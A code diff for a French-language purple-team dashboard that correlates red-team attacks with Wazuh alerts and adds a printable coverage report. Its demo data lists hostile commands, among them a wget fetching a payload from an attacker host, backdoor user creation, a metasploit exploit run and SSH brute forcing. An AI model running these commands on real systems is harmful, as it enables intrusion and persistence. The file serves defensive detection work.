@@ -7,8 +7,9 @@ import {
 } from "recharts";
 import {
   AlertCircle, Clock, Shield, ArrowRight, ChevronDown,
-  Activity, Target, CheckCircle2, Eye, Radio,
+  Activity, Target, CheckCircle2, Eye, Radio, FileDown,
 } from "lucide-react";
+import { Link } from "react-router-dom";
 import { PageHeader } from "../../components/ui/PageHeader";
 import { useUiStore } from "../../store/useUiStore";
 import { useTheme } from "../../contexts/ThemeContext";
@@ -67,9 +68,9 @@ const getDelayLabel = (d: number) =>
 
 // ─── Demo Data ─────────────────────────────────────────────────────────────────
 
-const DEMO_KPI = { coverage: 58, totalAttacks: 12, detectedAttacks: 7, missedAttacks: 5, mttdAvg: 48, exerciseDuration: "28m" };
+export const DEMO_KPI = { coverage: 58, totalAttacks: 12, detectedAttacks: 7, missedAttacks: 5, mttdAvg: 48, exerciseDuration: "28m" };
 
-const DEMO_MISSED: MissedAttack[] = [
+export const DEMO_MISSED: MissedAttack[] = [
   { id: "ATK-03", time: "14:08:15", tool: "sudo",       technique: "T1548", techniqueName: "Élévation de privilèges",           attempts: 5, missReason: "NO_RULE",  command: "sudo -l && sudo su root", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
   { id: "ATK-06", time: "14:12:33", tool: "metasploit", technique: "T1190", techniqueName: "Exploitation d'application exposée", attempts: 2, missReason: "NO_RULE",  command: "use exploit/unix/webapp/php_include; set RHOST 10.0.0.5; run", targetIp: "10.0.0.5", sourceIp: "192.168.1.100" },
   { id: "ATK-08", time: "14:16:45", tool: "useradd",    technique: "T1136", techniqueName: "Création de compte — Backdoor",     attempts: 1, missReason: "TIMEOUT", timeoutDelay: "+7m 12s", command: "useradd -m -s /bin/bash backdoor && echo 'backdoor:p4ss' | chpasswd", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
@@ -77,7 +78,7 @@ const DEMO_MISSED: MissedAttack[] = [
   { id: "ATK-14", time: "14:27:55", tool: "wget",       technique: "T1105", techniqueName: "Transfert d'outil malveillant",      attempts: 2, missReason: "TIMEOUT", timeoutDelay: "+4m 38s", command: "wget http://192.168.1.100:8080/payload.sh -O /tmp/.payload && chmod +x /tmp/.payload", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
 ];
 
-const DEMO_DETECTED: DetectedAttack[] = [
+export const DEMO_DETECTED: DetectedAttack[] = [
   { id: "ATK-01", time: "14:00:00", tool: "nmap",     technique: "T1046", techniqueName: "Balayage des services réseau",     delaySeconds: 45,  command: "nmap -sS -sV -O 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-01", ruleId: "40101", ruleName: "Scanner réseau détecté",                severity: "MEDIUM",   time: "14:00:45", agent: "wazuh-agent-01", description: "Balayage de ports depuis 192.168.1.100 vers le sous-réseau 10.0.0.0/24. Signature TCP SYN flood détectée. 1 247 paquets en 38s." } },
   { id: "ATK-02", time: "14:01:55", tool: "hydra",    technique: "T1110", techniqueName: "Force brute — SSH",                delaySeconds: 15,  command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-02", ruleId: "5710",  ruleName: "Échecs multiples de connexion SSH",    severity: "HIGH",     time: "14:02:10", agent: "wazuh-agent-02", description: "847 échecs SSH depuis 192.168.1.100 en 60s. Force brute confirmée. Comptes ciblés : root, admin, ubuntu." } },
   { id: "ATK-04", time: "14:09:30", tool: "gobuster", technique: "T1083", techniqueName: "Découverte de fichiers et répertoires", delaySeconds: 88, command: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-04", ruleId: "31101", ruleName: "Scanner web — Énumération de répertoires", severity: "MEDIUM", time: "14:10:58", agent: "wazuh-agent-03", description: "Plus de 3 400 requêtes sur Apache access.log depuis 192.168.1.100. Bruteforce de répertoires confirmé." } },
@@ -463,6 +464,235 @@ const LiveEmptyState = ({ onToggle }: { onToggle: () => void }) => (
     </button>
   </motion.div>
 );
+
+// ─── Printable PDF Report ─────────────────────────────────────────────────────
+
+export interface PrintableReportProps {
+  kpi: typeof DEMO_KPI;
+  detected: DetectedAttack[];
+  missed: MissedAttack[];
+  noRuleCount: number;
+  timeoutCount: number;
+}
+
+export const PrintableReport = ({ kpi, detected, missed, noRuleCount, timeoutCount }: PrintableReportProps) => {
+  const today = new Date().toLocaleDateString("fr-FR", { day: "2-digit", month: "long", year: "numeric" });
+  const time  = new Date().toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
+
+  const sevColor: Record<Severity, string> = { LOW: "#2563eb", MEDIUM: "#d97706", HIGH: "#ea580c", CRITICAL: "#dc2626" };
+
+  const detectedByTool = Object.values(
+    detected.reduce<Record<string, { tool: string; count: number; avgDelay: number; total: number }>>((acc, d) => {
+      const cur = acc[d.tool] ?? { tool: d.tool, count: 0, avgDelay: 0, total: 0 };
+      cur.count += 1;
+      cur.total += d.delaySeconds;
+      cur.avgDelay = Math.round(cur.total / cur.count);
+      acc[d.tool] = cur;
+      return acc;
+    }, {})
+  ).sort((a, b) => b.count - a.count);
+
+  const titleStyle: React.CSSProperties = {
+    fontSize: "11px", fontWeight: 700, letterSpacing: "0.18em", textTransform: "uppercase",
+    color: "#0f172a", borderBottom: "2px solid #0f172a", paddingBottom: "4px", marginBottom: "10px",
+  };
+  const cellStyle: React.CSSProperties = { padding: "6px 8px", border: "1px solid #e2e8f0", fontSize: "9px", verticalAlign: "top" };
+  const thStyle: React.CSSProperties = { ...cellStyle, background: "#f1f5f9", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.06em", fontSize: "8px", color: "#334155" };
+
+  return (
+    <div className="print-report" style={{
+      display: "none", color: "#0f172a", background: "white", fontFamily: "'Helvetica Neue', Arial, sans-serif",
+      padding: "0", lineHeight: 1.4,
+    }}>
+      {/* HEADER */}
+      <header style={{ borderBottom: "3px solid #0f172a", paddingBottom: "12px", marginBottom: "18px" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end" }}>
+          <div>
+            <p style={{ fontSize: "9px", letterSpacing: "0.28em", color: "#dc2626", fontWeight: 700, margin: 0 }}>● ANALYTICS — PURPLE TEAM</p>
+            <h1 style={{ fontSize: "24px", fontWeight: 800, margin: "4px 0 2px 0", letterSpacing: "0.02em" }}>RAPPORT DE COUVERTURE</h1>
+            <p style={{ fontSize: "10px", color: "#64748b", margin: 0 }}>Corrélation Red Team × Wazuh — Détection des angles morts</p>
+          </div>
+          <div style={{ textAlign: "right", fontSize: "9px", color: "#475569" }}>
+            <p style={{ margin: 0 }}><strong>Date :</strong> {today}</p>
+            <p style={{ margin: "2px 0" }}><strong>Heure :</strong> {time}</p>
+            <p style={{ margin: 0 }}><strong>Durée exercice :</strong> {kpi.exerciseDuration}</p>
+          </div>
+        </div>
+      </header>
+
+      {/* KPI GRID */}
+      <section style={{ marginBottom: "18px" }}>
+        <h2 style={titleStyle}>1 · Indicateurs Clés</h2>
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: "8px" }}>
+          {[
+            { label: "Taux de Détection", value: `${kpi.coverage}%`, sub: `${kpi.detectedAttacks} / ${kpi.totalAttacks} attaques`, color: kpi.coverage >= 67 ? "#16a34a" : kpi.coverage >= 33 ? "#d97706" : "#dc2626" },
+            { label: "Attaques Détectées", value: String(kpi.detectedAttacks), sub: "Corrélations Wazuh", color: "#16a34a" },
+            { label: "Angles Morts", value: String(kpi.missedAttacks), sub: `${noRuleCount} sans règle · ${timeoutCount} délai`, color: "#dc2626" },
+            { label: "MTTD Moyen", value: `${kpi.mttdAvg}s`, sub: "Mean Time To Detect", color: "#0ea5e9" },
+          ].map((k) => (
+            <div key={k.label} style={{ border: "1px solid #cbd5e1", borderTop: `3px solid ${k.color}`, padding: "8px 10px", borderRadius: "2px" }}>
+              <p style={{ fontSize: "8px", letterSpacing: "0.15em", textTransform: "uppercase", color: "#64748b", margin: 0 }}>{k.label}</p>
+              <p style={{ fontSize: "22px", fontWeight: 800, color: k.color, margin: "4px 0 2px 0", fontFamily: "'Courier New', monospace" }}>{k.value}</p>
+              <p style={{ fontSize: "8px", color: "#475569", margin: 0 }}>{k.sub}</p>
+            </div>
+          ))}
+        </div>
+      </section>
+
+      {/* DETECTED ATTACKS — Detailed correlation cards */}
+      <section style={{ marginBottom: "18px" }}>
+        <h2 style={titleStyle}>2 · Attaques Détectées — Preuves de Corrélation ({detected.length})</h2>
+        <p style={{ fontSize: "9px", color: "#64748b", margin: "0 0 10px 0", fontStyle: "italic" }}>
+          Chaque attaque Red Team est appariée à son alerte Wazuh correspondante avec délai de détection et preuve complète.
+        </p>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: "8px" }}>
+          {detected.map((d) => {
+            const dColor = delayColor(d.delaySeconds, false);
+            return (
+              <div key={d.id} className="detected-card" style={{ border: "1px solid #cbd5e1", borderRadius: "3px", overflow: "hidden" }}>
+                {/* Card header */}
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", background: "#f1f5f9", padding: "5px 10px", borderBottom: "1px solid #cbd5e1" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                    <span style={{ fontFamily: "'Courier New', monospace", fontWeight: 700, fontSize: "10px", color: "#0f172a" }}>{d.id} → {d.alert.id}</span>
+                    <span style={{ fontFamily: "'Courier New', monospace", fontSize: "9px", color: "#475569" }}>{d.time}</span>
+                  </div>
+                  <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                    <span style={{ fontFamily: "'Courier New', monospace", fontSize: "11px", fontWeight: 800, color: dColor }}>{d.delaySeconds}s</span>
+                    <span style={{ fontSize: "8px", fontWeight: 700, color: sevColor[d.alert.severity], textTransform: "uppercase", letterSpacing: "0.1em" }}>
+                      {SEVERITY_FR[d.alert.severity]}
+                    </span>
+                  </div>
+                </div>
+                {/* Two-column body: Red Team | Wazuh */}
+                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "0" }}>
+                  {/* Red Team side */}
+                  <div style={{ padding: "8px 10px", borderRight: "1px solid #e2e8f0", background: "#fef2f211" }}>
+                    <p style={{ margin: 0, fontSize: "8px", fontWeight: 700, color: "#dc2626", letterSpacing: "0.18em", textTransform: "uppercase", marginBottom: "5px" }}>
+                      ▸ Red Team — Attaque
+                    </p>
+                    <table style={{ width: "100%", fontSize: "8.5px", borderCollapse: "collapse" }}>
+                      <tbody>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b", width: "65px" }}>Technique :</td><td style={{ padding: "1px 0" }}><strong>{d.technique}</strong> — {d.techniqueName}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>Outil :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace", color: TOOL_COLORS[d.tool], fontWeight: 700 }}>{d.tool}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>IP Source :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace" }}>{d.sourceIp}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>IP Cible :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace" }}>{d.targetIp}</td></tr>
+                      </tbody>
+                    </table>
+                    <div style={{ marginTop: "5px", padding: "4px 6px", background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "2px" }}>
+                      <p style={{ margin: 0, fontSize: "7px", color: "#dc2626", textTransform: "uppercase", letterSpacing: "0.1em", fontWeight: 700, marginBottom: "2px" }}>Commande exécutée</p>
+                      <code style={{ fontFamily: "'Courier New', monospace", fontSize: "8px", color: "#1e293b", wordBreak: "break-all", display: "block" }}>{d.command}</code>
+                    </div>
+                  </div>
+                  {/* Wazuh side */}
+                  <div style={{ padding: "8px 10px", background: "#eff6ff11" }}>
+                    <p style={{ margin: 0, fontSize: "8px", fontWeight: 700, color: "#2563eb", letterSpacing: "0.18em", textTransform: "uppercase", marginBottom: "5px" }}>
+                      ▸ Wazuh — Alerte
+                    </p>
+                    <table style={{ width: "100%", fontSize: "8.5px", borderCollapse: "collapse" }}>
+                      <tbody>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b", width: "70px" }}>Horodatage :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace" }}>{d.alert.time}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>ID Règle :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace", fontWeight: 700 }}>#{d.alert.ruleId}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>Règle :</td><td style={{ padding: "1px 0" }}>{d.alert.ruleName}</td></tr>
+                        <tr><td style={{ padding: "1px 0", color: "#64748b" }}>Agent :</td><td style={{ padding: "1px 0", fontFamily: "'Courier New', monospace" }}>{d.alert.agent}</td></tr>
+                      </tbody>
+                    </table>
+                    <div style={{ marginTop: "5px", padding: "4px 6px", background: "#eff6ff", border: "1px solid #bfdbfe", borderRadius: "2px" }}>
+                      <p style={{ margin: 0, fontSize: "7px", color: "#2563eb", textTransform: "uppercase", letterSpacing: "0.1em", fontWeight: 700, marginBottom: "2px" }}>Description</p>
+                      <p style={{ margin: 0, fontSize: "8px", color: "#1e293b", lineHeight: 1.4 }}>{d.alert.description}</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            );
+          })}
+        </div>
+      </section>
+
+      {/* MISSED ATTACKS */}
+      <section style={{ marginBottom: "18px" }}>
+        <h2 style={titleStyle}>3 · Angles Morts — Attaques Manquées ({missed.length})</h2>
+        <table style={{ width: "100%", borderCollapse: "collapse" }}>
+          <thead>
+            <tr>
+              <th style={thStyle}>ID</th>
+              <th style={thStyle}>Heure</th>
+              <th style={thStyle}>Outil</th>
+              <th style={thStyle}>Technique MITRE</th>
+              <th style={thStyle}>Tentatives</th>
+              <th style={thStyle}>Cause</th>
+              <th style={thStyle}>Cible</th>
+            </tr>
+          </thead>
+          <tbody>
+            {missed.map((m) => (
+              <tr key={m.id}>
+                <td style={{ ...cellStyle, fontFamily: "'Courier New', monospace", fontWeight: 700 }}>{m.id}</td>
+                <td style={{ ...cellStyle, fontFamily: "'Courier New', monospace" }}>{m.time}</td>
+                <td style={{ ...cellStyle, fontFamily: "'Courier New', monospace", color: TOOL_COLORS[m.tool] }}>{m.tool}</td>
+                <td style={cellStyle}><strong>{m.technique}</strong> — {m.techniqueName}</td>
+                <td style={{ ...cellStyle, textAlign: "center", fontFamily: "'Courier New', monospace" }}>{m.attempts}</td>
+                <td style={{ ...cellStyle, color: "#dc2626", fontWeight: 700 }}>
+                  {m.missReason === "NO_RULE" ? "RÈGLE MANQUANTE" : `DÉLAI DÉPASSÉ ${m.timeoutDelay ?? ""}`}
+                </td>
+                <td style={{ ...cellStyle, fontFamily: "'Courier New', monospace" }}>{m.targetIp}</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </section>
+
+      {/* TOOL BREAKDOWN */}
+      <section style={{ marginBottom: "18px" }}>
+        <h2 style={titleStyle}>4 · Répartition par Outil Red Team</h2>
+        <table style={{ width: "100%", borderCollapse: "collapse" }}>
+          <thead>
+            <tr>
+              <th style={thStyle}>Outil</th>
+              <th style={thStyle}>Détections</th>
+              <th style={thStyle}>Délai Moyen</th>
+              <th style={thStyle}>Part du Total</th>
+            </tr>
+          </thead>
+          <tbody>
+            {detectedByTool.map((t) => (
+              <tr key={t.tool}>
+                <td style={{ ...cellStyle, fontFamily: "'Courier New', monospace", fontWeight: 700, color: TOOL_COLORS[t.tool] }}>{t.tool}</td>
+                <td style={{ ...cellStyle, textAlign: "center", fontFamily: "'Courier New', monospace" }}>{t.count}</td>
+                <td style={{ ...cellStyle, textAlign: "center", fontFamily: "'Courier New', monospace", color: delayColor(t.avgDelay, false) }}>{t.avgDelay}s</td>
+                <td style={{ ...cellStyle, textAlign: "center", fontFamily: "'Courier New', monospace" }}>{Math.round((t.count / detected.length) * 100)}%</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </section>
+
+      {/* COMMANDS DETAIL — Missed attacks only (detected ones are in section 2) */}
+      <section style={{ marginBottom: "18px" }}>
+        <h2 style={titleStyle}>5 · Charges Utiles des Attaques Manquées</h2>
+        <p style={{ fontSize: "9px", color: "#64748b", margin: "0 0 8px 0", fontStyle: "italic" }}>
+          Commandes ayant échappé à la détection Wazuh — base pour la création de nouvelles règles.
+        </p>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: "6px" }}>
+          {missed.map((a) => (
+            <div key={a.id} style={{ border: "1px solid #e2e8f0", borderLeft: "3px solid #dc2626", padding: "6px 10px", fontSize: "9px" }}>
+              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "3px" }}>
+                <span style={{ fontFamily: "'Courier New', monospace", fontWeight: 700 }}>{a.id} · {a.time} · <span style={{ color: TOOL_COLORS[a.tool] }}>{a.tool}</span></span>
+                <span style={{ fontWeight: 700, color: "#dc2626" }}>✗ {a.missReason === "NO_RULE" ? "RÈGLE MANQUANTE" : `DÉLAI DÉPASSÉ ${a.timeoutDelay ?? ""}`}</span>
+              </div>
+              <p style={{ margin: "2px 0", fontFamily: "'Courier New', monospace", fontSize: "8px", color: "#1e293b", wordBreak: "break-all" }}>{a.command}</p>
+            </div>
+          ))}
+        </div>
+      </section>
+
+      {/* FOOTER */}
+      <footer style={{ marginTop: "24px", paddingTop: "10px", borderTop: "1px solid #cbd5e1", fontSize: "8px", color: "#64748b", display: "flex", justifyContent: "space-between" }}>
+        <span>Tracks4Hacks · Coverage Scoreboard · Rapport généré automatiquement</span>
+        <span>Page <span className="page-number" /></span>
+      </footer>
+    </div>
+  );
+};
 
 // ─── Main ──────────────────────────────────────────────────────────────────────
 
@@ -971,6 +1201,52 @@ export default function Coverage() {
               </div>
             </div>
           </section>
+
+          {/* ── EXPORT REPORT CTA ──────────────────────────────────────────── */}
+          <motion.section
+            initial={{ opacity: 0, y: 16 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            viewport={{ once: true, margin: "-80px" }}
+            transition={{ duration: 0.5, ease: [0.32, 0.72, 0, 1] }}
+            className="relative overflow-hidden rounded-3xl border border-slate-200 bg-gradient-to-br from-white via-white to-slate-50 p-6 shadow-sm dark:border-white/[0.08] dark:from-black/40 dark:via-black/30 dark:to-night-bordeaux-950/20 dark:shadow-none dark:backdrop-blur-sm sm:p-8"
+          >
+            <motion.div
+              aria-hidden
+              animate={{ x: [0, 18, 0], y: [0, -10, 0] }}
+              transition={{ duration: 6, repeat: Infinity, ease: "easeInOut" }}
+              className="pointer-events-none absolute -right-16 -top-16 size-56 rounded-full bg-gradient-to-br from-red-200/35 via-orange-200/25 to-transparent blur-3xl dark:from-night-bordeaux-500/15 dark:via-orange-500/10"
+            />
+
+            <div className="relative flex flex-col items-start gap-6 sm:flex-row sm:items-center sm:justify-between">
+              <div className="flex items-start gap-4">
+                <div className="flex size-11 shrink-0 items-center justify-center rounded-2xl border border-night-bordeaux-200 bg-night-bordeaux-50 dark:border-night-bordeaux-500/30 dark:bg-night-bordeaux-500/10">
+                  <FileDown size={18} className="text-night-bordeaux-600 dark:text-night-bordeaux-400" />
+                </div>
+                <div>
+                  <p className="font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">
+                    Besoin d'un rapport partageable ?
+                  </p>
+                  <p className="mt-1.5 max-w-md font-mono text-[11px] leading-relaxed text-slate-500 dark:text-coffee-bean-200/55">
+                    Exporte toutes les données de cet exercice en un PDF audit-ready : KPIs, preuves de corrélation Red Team ↔ Wazuh, angles morts et charges utiles.
+                  </p>
+                </div>
+              </div>
+
+              <Link
+                to="/dashboard/incidents"
+                className="group inline-flex shrink-0 items-center gap-2.5 rounded-full border border-night-bordeaux-300/60 bg-gradient-to-br from-night-bordeaux-500 via-red-600 to-night-bordeaux-700 px-5 py-2.5 font-mono text-[11px] font-bold uppercase tracking-[0.2em] text-white shadow-[0_8px_28px_-8px_rgba(196,59,59,0.55)] transition-all hover:shadow-[0_14px_40px_-8px_rgba(196,59,59,0.8)] dark:border-night-bordeaux-400/40"
+              >
+                Générer le rapport
+                <motion.span
+                  className="inline-flex"
+                  animate={{ x: [0, 4, 0] }}
+                  transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
+                >
+                  <ArrowRight size={14} />
+                </motion.span>
+              </Link>
+            </div>
+          </motion.section>
 
         </>
       )}
